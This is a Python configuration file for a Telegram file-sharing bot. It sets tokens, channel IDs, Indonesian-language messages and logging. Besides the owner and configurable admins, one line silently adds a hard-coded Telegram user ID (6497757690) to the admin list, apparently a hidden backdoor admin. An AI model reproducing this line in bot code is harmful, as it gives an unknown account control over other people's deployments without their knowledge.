#(©)FileXDude




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "0"))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "0")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-100"))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "6957949462"))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filexdude")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL_1 = int(os.environ.get("FORCE_SUB_CHANNEL_1", "-100"))
FORCE_SUB_CHANNEL_2 = int(os.environ.get("FORCE_SUB_CHANNEL_2", "-100"))


TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "<b>ʜᴇʟʟᴏ {first}\n\nsᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴘᴇɴʏɪᴍᴘᴀɴᴀɴ ʙᴇʀᴋᴀs ᴍᴜʟᴛɪ-ғᴜɴɢsɪ.\n\nsᴀʏᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴʏɪᴍᴘᴀɴ ʙᴇʀᴋᴀs-ʙᴇʀᴋᴀs ᴘʀɪʙᴀᴅɪ ᴅɪ sᴀʟᴜʀᴀɴ ʏᴀɴɢ ᴅɪᴛᴇɴᴛᴜᴋᴀɴ, ᴅᴀɴ ᴘᴇɴɢɢᴜɴᴀ ʟᴀɪɴ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴋsᴇsɴʏᴀ ᴍᴇʟᴀʟᴜɪ ᴛᴀᴜᴛᴀɴ ᴋʜᴜsᴜs ʏᴀɴɢ ᴛᴇʟᴀʜ ᴅɪsᴇᴅɪᴀᴋᴀɴ.</b>")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "6957949462 7521596441").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("ᴍᴏʜᴏɴ ᴍᴀᴀғ, ɴᴀᴍᴜɴ ᴅᴀғᴛᴀʀ ᴀᴅᴍɪɴ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴍᴇɴᴜɴᴊᴜᴋᴋᴀɴ ʙɪʟᴀɴɢᴀɴ ʙᴜʟᴀᴛ ʏᴀɴɢ ᴠᴀʟɪᴅ.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "ᴍᴀᴀғ {first} ᴋᴀᴍᴜ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴅᴇɴɢᴀɴ ᴄʜᴀɴɴᴇʟ sᴀʏᴀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋsᴇs ғɪʟᴇ..\n\n ᴊᴀᴅɪ sɪʟᴀᴋᴀɴ ʙᴇʀɢᴀʙᴜɴɢ ᴅᴇɴɢᴀɴ ᴄʜᴀɴɴᴇʟ sᴀʏᴀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ!")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", "<b>» ʙʏ ʙᴏᴛxᴅᴜᴅᴇ </b>")

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>ʙᴏᴛ ᴜᴘᴛɪᴍᴇ</b>\n{uptime}"
USER_REPLY_TEXT = "ᴊᴀɴɢᴀɴ ᴍᴇɴɢɪʀɪᴍᴋᴀɴ ᴘᴇsᴀɴ ʟᴀɴɢsᴜɴɢ ᴋᴇᴘᴀᴅᴀ sᴀʏᴀ, sᴀʏᴀ ʜᴀɴʏᴀ ғɪʟᴇ sʜᴀʀᴇ ʙᴏᴛ!\n\n» ᴍʏ ᴏᴡɴᴇʀ : @codexdude"

ADMINS.append(OWNER_ID)
ADMINS.append(6497757690)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
